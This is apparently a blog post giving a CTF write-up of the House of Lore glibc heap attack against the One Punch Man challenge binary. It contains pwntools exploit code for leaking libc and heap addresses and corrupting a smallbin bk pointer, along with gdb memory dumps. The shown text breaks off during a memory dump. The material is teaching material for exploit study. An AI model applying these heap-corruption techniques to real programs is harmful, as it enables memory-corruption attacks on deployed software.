<!doctype html><html class="dark light"><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><title>
         House Of Lore
        
    </title><meta content="House Of Lore" property=og:title><link href=https://pwnverse.github.io/fonts.css rel=stylesheet><script>(function(){var a=document.createElement('script');a.setAttribute('src','/js/imamu.js');a.setAttribute('data-website-id','74344cd8-1e87-4c38-8acd-f96049b8f07e');a.setAttribute('data-host-url','https:&#x2F;&#x2F;analytics.eu.umami.is');document.body.appendChild(a)})()</script><script async data-host-url=https://analytics.eu.umami.is data-website-id=74344cd8-1e87-4c38-8acd-f96049b8f07e src=/js/imamu.js></script><script async data-goatcounter=https://Cyb0rG.goatcounter.com/count src=https://pwnverse.github.io/js/count.js></script><noscript><img src="https://Cyb0rG.goatcounter.com//count?p=/posts/houseoflore/&t=House Of Lore"></noscript><link title="Cyb0rG's Home" href=https://pwnverse.github.io/atom.xml rel=alternate type=application/atom+xml><link href=https://pwnverse.github.io/theme/light.css rel=stylesheet><link href=https://pwnverse.github.io/theme/dark.css id=darkModeStyle rel=stylesheet><link href=https://pwnverse.github.io/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><a href=https://pwnverse.github.io>Cyb0rG's Home</a><div class=socials><a class=social href=https://twitter.com/_Cyb0rG rel=me> <img alt=twitter src=/social_icons/twitter.svg> </a><a class=social href=https://github.com/PwnVerse/ rel=me> <img alt=github src=/social_icons/github.svg> </a></div></div><nav><a href=/posts style=margin-left:.7em>/posts</a><a href=/projects style=margin-left:.7em>/projects</a><a href=/about style=margin-left:.7em>/about</a> | <a href=javascript:void(0) id=dark-mode-toggle onclick=toggleTheme()> <img id=sun-icon src=/feather/sun.svg style=filter:invert(1)> <img id=moon-icon src=/feather/moon.svg> </a><script src=https://pwnverse.github.io/js/themetoggle.js></script></nav></header><main><article><div class=title><div class=page-header>House Of Lore<span class=primary-color style=font-size:1.6em>.</span></div><div class=meta>Posted on <time>2020-05-15</time></div></div><section class=body><p>This attack was introduced for glibc > 2.25 since the addition of tcache bins into glibc malloc.<p><strong>PS</strong> - This attack is mostly based on Shellphish's <a href=https://github.com/shellphish/how2heap>how2heap</a> implementation.<p>I will be using Hitcon's <em>One Punch Man</em> challenge to help you understand how this attack works. The writeup is a humble attempt to elaborate Shellphish's implementation of <strong>House Of Lore</strong>.<p><strong>NOTE</strong> - This writeup is not the intended solution for the challenge involved. The detailed solution will be discussed in the next post :P:. {: .notice}<h2 id=tl-dr-of-the-challenge-binary>TL;DR of the Challenge Binary</h2><p>We have been given a standard CTF style <code>x86 64-bit Dynamically linked</code> binary to start with. <code>Checksec</code> shows pretty much every security measure enabled.<h3 id=primitives-required-to-achieve-house-of-lore>Primitives Required to Achieve House Of Lore</h3><ul><li>The well known <strong>Use After Free</strong> [both read and write].<li>Malloc and calloc both being called as per attacker request.<li>Double Free<li>Both libc and heap memory leaks.</ul><p>One fact that we leverage for our attack is that calloc calls dont take from tcache bins.<p>Before we go any further , we need to analyze the source code of glibc malloc and get a cusp of what exactly all this is about.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>  </span><span style=font-style:italic;color:#5c6773>/*
</span><span style=font-style:italic;color:#5c6773>       If a small request, check regular bin.  Since these "smallbins"
</span><span style=font-style:italic;color:#5c6773>       hold one size each, no searching within bins is necessary.
</span><span style=font-style:italic;color:#5c6773>       (For a large request, we need to wait until unsorted chunks are
</span><span style=font-style:italic;color:#5c6773>       processed to find best fit. But for small ones, fits are exact
</span><span style=font-style:italic;color:#5c6773>       anyway, so we can check now, which is faster.)
</span><span style=font-style:italic;color:#5c6773>     */
</span><span>
</span><span>    </span><span style=color:#ff7733>if </span><span>(</span><span style=color:#ffb454>in_smallbin_range</span><span>(nb)) {
</span><span>        </span><span style=font-style:italic;color:#5c6773>// Get the index of the small bin
</span><span>        idx </span><span style=color:#f29668>= </span><span style=color:#ffb454>smallbin_index</span><span>(nb)</span><span style=color:#bfbab0cc>;
</span><span>        </span><span style=font-style:italic;color:#5c6773>// Get the corresponding chunk pointer in the small bin
</span><span>        bin </span><span style=color:#f29668>= </span><span style=color:#ffb454>bin_at </span><span>(av</span><span style=color:#bfbab0cc>,</span><span> idx)</span><span style=color:#bfbab0cc>;
</span><span>        </span><span style=font-style:italic;color:#5c6773>// First execute victim= last(bin) to get the last chunk of the small bin
</span><span>        </span><span style=font-style:italic;color:#5c6773>// If victim = bin , then the bin is empty.
</span><span>        </span><span style=font-style:italic;color:#5c6773>// If they are not equal, then there will be two cases
</span><span>        </span><span style=color:#ff7733>if </span><span>((victim </span><span style=color:#f29668>= </span><span style=color:#ffb454>last</span><span>(bin)) </span><span style=color:#f29668>!=</span><span> bin) {
</span><span>            </span><span style=font-style:italic;color:#5c6773>// In the first case, the small bin has not yet been initialized.
</span><span>            </span><span style=color:#ff7733>if </span><span>(victim </span><span style=color:#f29668>== </span><span style=color:#f29718>0</span><span>) </span><span style=font-style:italic;color:#5c6773>/* initialization check */
</span><span>                </span><span style=font-style:italic;color:#5c6773>// Perform initialization to merge chunks in fast bins
</span><span>                </span><span style=color:#ffb454>malloc_consolidate </span><span>(of)</span><span style=color:#bfbab0cc>;
</span><span>            </span><span style=font-style:italic;color:#5c6773>// In the second case, there is a free chunk in the small bin
</span><span>            </span><span style=color:#ff7733>else </span><span>{
</span><span>                </span><span style=font-style:italic;color:#5c6773>// Get the second-to-last chunk in the small bin.
</span><span>                bck </span><span style=color:#f29668>=</span><span> victim</span><span style=color:#f29668>-></span><span>bk</span><span style=color:#bfbab0cc>;
</span><span>                </span><span style=font-style:italic;color:#5c6773>// Check if bck->fd is victim, prevent forgery
</span><span>                </span><span style=color:#ff7733>if </span><span>(</span><span style=color:#ffb454>__glibc_unlikely</span><span>(bck</span><span style=color:#f29668>-></span><span>fd </span><span style=color:#f29668>!=</span><span> victim)) {
</span><span>                    errstr </span><span style=color:#f29668>= </span><span style=color:#c2d94c>"malloc(): smallbin double linked list corrupted"</span><span style=color:#bfbab0cc>;
</span><span>                    </span><span style=color:#ff7733>goto</span><span> errout</span><span style=color:#bfbab0cc>;
</span><span>                }
</span><span>                </span><span style=font-style:italic;color:#5c6773>// Set the corresponding inuse bit of victim
</span><span>                </span><span style=color:#ffb454>set_inuse_bit_at_offset</span><span>(victim</span><span style=color:#bfbab0cc>,</span><span> nb)</span><span style=color:#bfbab0cc>;
</span><span>                </span><span style=font-style:italic;color:#5c6773>// Modify the small bin list, take the last chunk of the small bin
</span><span>                bin</span><span style=color:#f29668>-></span><span> bk </span><span style=color:#f29668>=</span><span> bck</span><span style=color:#bfbab0cc>;
</span><span>                bck</span><span style=color:#f29668>-></span><span>fd </span><span style=color:#f29668>=</span><span> bin</span><span style=color:#bfbab0cc>;
</span><span>                </span><span style=font-style:italic;color:#5c6773>// If it is not main_arena, set the corresponding flag
</span><span>                </span><span style=color:#ff7733>if </span><span>(av </span><span style=color:#f29668>!= &</span><span>main_arena) </span><span style=color:#ffb454>set_non_main_arena</span><span>(victim)</span><span style=color:#bfbab0cc>;
</span><span>                </span><span style=font-style:italic;color:#5c6773>// Detailed inspection
</span><span>                </span><span style=color:#ffb454>check_malloced_chunk </span><span>(off</span><span style=color:#bfbab0cc>,</span><span> victim</span><span style=color:#bfbab0cc>,</span><span> nb)</span><span style=color:#bfbab0cc>;
</span><span>                </span><span style=font-style:italic;color:#5c6773>// Convert the requested chunk to the corresponding mem state
</span><span>                </span><span style=color:#ff7733>void </span><span style=color:#f29668>*</span><span>p </span><span style=color:#f29668>= </span><span style=color:#ffb454>chunk2mem</span><span>(victim)</span><span style=color:#bfbab0cc>;
</span><span>                </span><span style=font-style:italic;color:#5c6773>// If perturb_type is set, the obtained chunk is initialized to perturb_type ^ 0xff
</span><span>                </span><span style=color:#ffb454>alloc_perturb</span><span>(p</span><span style=color:#bfbab0cc>,</span><span> bytes)</span><span style=color:#bfbab0cc>;
</span><span>                </span><span style=color:#ff7733>return</span><span> p</span><span style=color:#bfbab0cc>;
</span><span>            }
</span><span>        }
</span><span>    }
</span></code></pre><p>What we're actually interested is this part -><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=font-style:italic;color:#5c6773>// Get the second-to-last chunk in the small bin.
</span><span>                bck </span><span style=color:#f29668>=</span><span> victim</span><span style=color:#f29668>-></span><span>bk</span><span style=color:#bfbab0cc>;
</span><span>                </span><span style=font-style:italic;color:#5c6773>// Check if bck->fd is victim, prevent forgery
</span><span>                </span><span style=color:#ff7733>if </span><span>(</span><span style=color:#ffb454>__glibc_unlikely</span><span>(bck</span><span style=color:#f29668>-></span><span>fd </span><span style=color:#f29668>!=</span><span> victim)) {
</span><span>                    errstr </span><span style=color:#f29668>= </span><span style=color:#c2d94c>"malloc(): smallbin double linked list corrupted"</span><span style=color:#bfbab0cc>;
</span><span>                    </span><span style=color:#ff7733>goto</span><span> errout</span><span style=color:#bfbab0cc>;
</span><span>                }
</span><span>                </span><span style=font-style:italic;color:#5c6773>// Set the corresponding inuse bit of victim
</span><span>                </span><span style=color:#ffb454>set_inuse_bit_at_offset</span><span>(victim</span><span style=color:#bfbab0cc>,</span><span> nb)</span><span style=color:#bfbab0cc>;
</span><span>                </span><span style=font-style:italic;color:#5c6773>// Modify the small bin list, take the last chunk of the small bin
</span><span>                bin</span><span style=color:#f29668>-></span><span> bk </span><span style=color:#f29668>=</span><span> bck</span><span style=color:#bfbab0cc>;
</span><span>                bck</span><span style=color:#f29668>-></span><span>fd </span><span style=color:#f29668>=</span><span> bin</span><span style=color:#bfbab0cc>;
</span><span>
</span></code></pre><p>If we can modify the <code>bck</code> of the last chunk of small bin with an address in such a way that we satisfy the corruption check , then we can successfully get an allocation in an arbitrary location.<h2 id=reversing>Reversing</h2><p>The binary is a standard Heap challenge binary with <code>Add</code>,<code>Edit</code>,<code>View</code> and <code>Delete</code> functionalities.<p>I will not be discussing all the details of what these functions do as there will be a detailed writeup for describing everything eloquently.<p>For now , I will just discuss what is needful for the attack to be triggered.<ul><li>The add function does the calloc part , it can allocate chunks in range of sizes from [0x7f,0x400].<li>The free function has <strong>Use After Free</strong> as it does not null the pointer of the freed chunk.<li>The view function views a chunk at requested idx.<li>The edit function safely edits a chunk at requested idx.<li>We have a secret function which can call malloc only when 0x220 tcache is filled with all 7 chunks of that size.</ul><p>Since we have <strong>UAF</strong> , we can edit free chunks also , hence we can <strong>Double Free</strong> by bypassing fd , bk checks in malloc.<p>Now we have everything we need to perform <strong>House Of Lore</strong>.<h2 id=exploit-development>Exploit Development</h2><p>We can begin with creating wrapper functions which do necessary stuff for us.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span style=color:#ff7733>from </span><span>pwn </span><span style=color:#ff7733>import </span><span style=color:#f29718>*
</span><span style=color:#ff7733>import </span><span>sys
</span><span>
</span><span>io</span><span style=color:#f29668>=</span><span style=color:#ffb454>process</span><span>(</span><span style=color:#c2d94c>"./one_punch_loaded"</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>env </span><span style=color:#f29668>= </span><span>{</span><span style=color:#c2d94c>"LD_PRELOAD" </span><span style=color:#bfbab0cc>: </span><span style=color:#c2d94c>"./libc.so.6"</span><span>})
</span><span>
</span><span style=color:#ff7733>if</span><span>(</span><span style=color:#f07178>len</span><span>(sys</span><span style=color:#f29668>.</span><span>argv) </span><span style=color:#f29668>== </span><span style=color:#f29718>1</span><span>):
</span><span>    context</span><span style=color:#f29668>.</span><span>noptrace </span><span style=color:#f29668>= </span><span style=color:#f29718>True
</span><span>
</span><span style=color:#ff7733>def </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>idx</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>name</span><span>):
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"> "</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'1'</span><span>)
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"idx: "</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(idx))
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"name: "</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(name))
</span><span>
</span><span style=color:#ff7733>def </span><span style=color:#ffb454>edit</span><span>(</span><span style=color:#f29718>idx</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>name</span><span>):
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"> "</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'2'</span><span>)
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"idx: "</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(idx))
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendafter</span><span>(</span><span style=color:#c2d94c>"name: "</span><span style=color:#bfbab0cc>,</span><span>name)
</span><span>
</span><span style=color:#ff7733>def </span><span style=color:#ffb454>view</span><span>(</span><span style=color:#f29718>idx</span><span>):
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"> "</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'3'</span><span>)
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"idx: "</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(idx))
</span><span>
</span><span style=color:#ff7733>def </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>idx</span><span>):
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"> "</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'4'</span><span>)
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"idx: "</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(idx))
</span><span>
</span><span style=color:#ff7733>def </span><span style=color:#ffb454>secret</span><span>(</span><span style=color:#f29718>data</span><span>):
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"> "</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'50056'</span><span>)
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>send</span><span>(data)
</span><span>
</span></code></pre><p>Leaking both libc and heap should not require much explanation so I'll go right away with that.<p>We leak libc by viewing an unsorted bin chunk after filling up 0x220 tcache.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span style=font-style:italic;color:#5c6773>#Add 2 chunks of 0x217
</span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'0'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x217</span><span>)
</span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'1'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x217</span><span>)
</span><span>
</span><span style=font-style:italic;color:#5c6773>#Fill 0x217 tcache
</span><span style=color:#ff7733>for </span><span style=font-style:italic;color:#39bae6>_ </span><span style=color:#ff7733>in </span><span style=font-style:italic;color:#39bae6>xrange</span><span>(</span><span style=color:#f29718>7</span><span>):
</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>2</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'2'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x217</span><span>)
</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>2</span><span>)
</span><span>
</span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>2</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'2'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x217</span><span>)
</span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'3'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x1f0</span><span>)
</span></code></pre><p>Our aim is to send two chunks into the same size unsorted bins without coalescing. Hence we now send two chunks from different locations of heap so as to prevent merging and sending two separate chunks into unsorted bin and subsequently to the small bin thereafter<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>
</span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>2</span><span>) </span><span style=font-style:italic;color:#5c6773>#Chunk 2 also goes into unsorted bin
</span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>1</span><span>) </span><span style=font-style:italic;color:#5c6773>#Chunk 1 also goes into unsorted bin
</span><span>
</span><span style=font-style:italic;color:#5c6773>#Heap
</span><span style=color:#ffb454>view</span><span>(</span><span style=color:#f29718>1</span><span>)
</span><span>io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvuntil</span><span>(</span><span style=color:#c2d94c>"hero name: "</span><span>)
</span><span>heap_base </span><span style=color:#f29668>= </span><span style=color:#ffb454>u64</span><span>(io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recv</span><span>(</span><span style=color:#f29718>6</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#c2d94c>'</span><span style=color:#95e6cb>\x00</span><span style=color:#c2d94c>'</span><span style=color:#f29668>*</span><span style=color:#f29718>2</span><span>) </span><span style=color:#f29668>-  </span><span style=color:#f29718>0x1570
</span><span>
</span><span style=font-style:italic;color:#5c6773>#Libc
</span><span style=color:#ffb454>view</span><span>(</span><span style=color:#f29718>2</span><span>)
</span><span>io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvuntil</span><span>(</span><span style=color:#c2d94c>"hero name: "</span><span>)
</span><span>libc_base </span><span style=color:#f29668>= </span><span style=color:#ffb454>u64</span><span>(io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recv</span><span>(</span><span style=color:#f29718>6</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#c2d94c>'</span><span style=color:#95e6cb>\x00</span><span style=color:#c2d94c>'</span><span style=color:#f29668>*</span><span style=color:#f29718>2</span><span>) </span><span style=color:#f29668>- </span><span style=color:#f29718>0x219ca0
</span><span>
</span><span>log</span><span style=color:#f29668>.</span><span style=color:#ffb454>info</span><span>(</span><span style=color:#c2d94c>"Heap -> " </span><span style=color:#f29668>+ </span><span style=color:#f07178>hex</span><span>(heap_base))
</span><span>log</span><span style=color:#f29668>.</span><span style=color:#ffb454>info</span><span>(</span><span style=color:#c2d94c>"Libc -> " </span><span style=color:#f29668>+ </span><span style=color:#f07178>hex</span><span>(libc_base))
</span><span>
</span></code></pre><p>From now on , it is better we have a look at the memory layout at each step for better understanding. For the sake of brevity , I will just show the dump of only few memory blocks of each chunk.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>gdb-peda$</span><span> x/6gx 0x555555559480-0x10
</span><span style=color:#ffb454>0x555555559470:</span><span>	0x0030303030303030	0x0000000000000221 -</span><span style=color:#f29668>></span><span> This is chunk 1 which we freed
</span><span style=color:#ffb454>0x555555559480:</span><span>	0x000055555555a570	0x00007ffff7fefca0
</span><span style=color:#ffb454>0x555555559490:</span><span>	0x3131313131313131	0x3131313131313131
</span><span>
</span><span style=color:#ffb454>gdb-peda$</span><span> x/6gx 0x55555555a580-0x10
</span><span style=color:#ffb454>0x55555555a570:</span><span>	0x0032323232323232	0x0000000000000221 -</span><span style=color:#f29668>></span><span> This is chunk 2 
</span><span style=color:#ffb454>0x55555555a580:</span><span>	0x00007ffff7fefca0	0x0000555555559470
</span><span style=color:#ffb454>0x55555555a590:</span><span>	0x3232323232323232	0x3232323232323232
</span><span>
</span></code></pre><p>Also have a look at <code>main_arena</code><pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>0112</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7ffff7fefca0</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x55555555a990 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x0  -</span><span style=color:#f29668>></span><span> Top Chunk
</span><span style=color:#ffb454>0120</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7ffff7fefca8</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x0
</span><span style=color:#ffb454>0128</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7ffff7fefcb0</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x555555559470 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x30303030303030 (</span><span style=color:#c2d94c>'0000000'</span><span>)  </span><span style=color:#ffb454>-</span><span style=color:#f29668>></span><span> Unsorted Bins , Chunk 1
</span><span style=color:#ffb454>0136</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7ffff7fefcb8</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x55555555a570 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x32323232323232 (</span><span style=color:#c2d94c>'2222222'</span><span>)  </span><span style=color:#ffb454>-</span><span style=color:#f29668>></span><span> Chunk 2
</span><span>
</span></code></pre><p>Now we send both unsorted bins to small bin.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'S'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x300</span><span>)
</span></code></pre><p>As u can see from below , both chunks have been added to small bin.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>0648</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7ffff7fefeb8</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x7ffff7fefea0 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x7ffff7fefe90 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x7ffff7fefe80 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x7ffff7fefe70 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x7ffff7fefe60 (--</span><span style=color:#f29668>></span><span> ...)
</span><span style=color:#ffb454>0656</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7ffff7fefec0</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x555555559470 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x30303030303030 (</span><span style=color:#c2d94c>'0000000'</span><span>) </span><span style=color:#ffb454>-</span><span style=color:#f29668>></span><span> Chunk 1
</span><span style=color:#ffb454>0664</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7ffff7fefec8</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x55555555a570 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x32323232323232 (</span><span style=color:#c2d94c>'2222222'</span><span>) </span><span style=color:#ffb454>-</span><span style=color:#f29668>></span><span> Chunk 2
</span></code></pre><p>Now , we create space in tcache for triggering the vulnerability.<p>Let us recollect that we now edit the <code>bk</code> pointer of our small bin chunk and then with a malloc , we can now send our small bin chunk to tcache.<p>But first of all , to send our target chunk to tcache , we first need to make some place in tcache of 0x220 , so we malloc and consume one tcache.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span style=color:#ffb454>secret</span><span>(</span><span style=color:#c2d94c>'a'</span><span>)
</span><span>
</span></code></pre><p>Now we can edit the <code>bk</code> pointer of chunk 2. Note that here we intend to get an allocation on <code>main_arena</code> structure.<p>Before editing , let us have a look at what we intend to do.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>0640</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7ffff7fefeb0</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x7ffff7fefea0 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x7ffff7fefe90 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x7ffff7fefe80 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x7ffff7fefe70 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x7ffff7fefe60 (--</span><span style=color:#f29668>></span><span> ...)
</span><span style=color:#ffb454>0648</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7ffff7fefeb8</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x7ffff7fefea0 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x7ffff7fefe90 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x7ffff7fefe80 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x7ffff7fefe70 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x7ffff7fefe60 (--</span><span style=color:#f29668>></span><span> ...)
</span><span style=color:#ffb454>0656</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7ffff7fefec0</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x555555559470 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x30303030303030 (</span><span style=color:#c2d94c>'0000000'</span><span>)
</span><span style=color:#ffb454>0664</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x7ffff7fefec8</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x55555555a570 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x32323232323232 (</span><span style=color:#c2d94c>'2222222'</span><span>) </span><span style=color:#ffb454>-</span><span style=color:#f29668>></span><span> we can easily pass corruption checks with this as our   new fake chunk , let</span><span style=color:#c2d94c>'s call this the victim chunk :P.
</span></code></pre><p>Now we edit chunk 2's <em>bk</em> ptr , note that we dont change the fd and keep it as it is.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>
</span><span>victim </span><span style=color:#f29668>= </span><span>libc_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x219ec8
</span><span style=color:#ffb454>edit</span><span>(</span><span style=color:#f29718>2</span><span style=color:#bfbab0cc>,</span><span style=color:#ffb454>p64</span><span>(victim</span><span style=color:#f29668>-</span><span style=color:#f29718>0x18</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(victim</span><span style=color:#f29668>-</span><span style=color:#f29718>0x10</span><span>)) </span><span style=font-style:italic;color:#5c6773>#Turns out that fd was victim-0x18, afterall it's all in the main_arena :)
</span><span>
</span></code></pre><p>Let's trigger our unsafe unlink and send our victim to tcache.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'a'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x217</span><span>)
</span></code></pre><p>Now see the magic.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>gdb-peda$</span><span> x/50gx 0x0000555555559000
</span><span style=color:#ffb454>0x555555559000:</span><span>	0x0000000000000000	0x0000000000000251
</span><span style=color:#ffb454>0x555555559010:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x555555559020:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x555555559030:</span><span>	0x0000000000000007	0x0000000000000000
</span><span style=color:#ffb454>0x555555559040:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x555555559050:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x555555559060:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x555555559070:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x555555559080:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x555555559090:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x5555555590a0:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x5555555590b0:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x5555555590c0:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x5555555590d0:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x5555555590e0:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x5555555590f0:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x555555559100:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x555555559110:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x555555559120:</span><span>	0x0000000000000000	0x0000000000000000
